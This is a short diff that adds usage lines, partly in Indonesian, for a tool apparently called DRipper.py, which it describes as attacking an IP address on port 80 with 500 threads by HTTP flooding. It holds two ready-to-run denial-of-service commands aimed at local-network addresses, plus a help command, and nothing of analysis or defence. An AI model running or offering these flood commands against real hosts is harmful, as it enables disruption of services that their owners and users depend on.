@@ -1,0 +1,5 @@
+python3 DRipper.py -s 192.168.1.1 -p 80 -t 500 -m http --> Menyerang IP tersebut pada port 80 (website) menggunakan 500 threads dengan metode banjir HTTP.
+
+python3 DRipper.py --help
+
+python3 dripper.py -s 192.168.1.10 -p 80 -t 500 -q
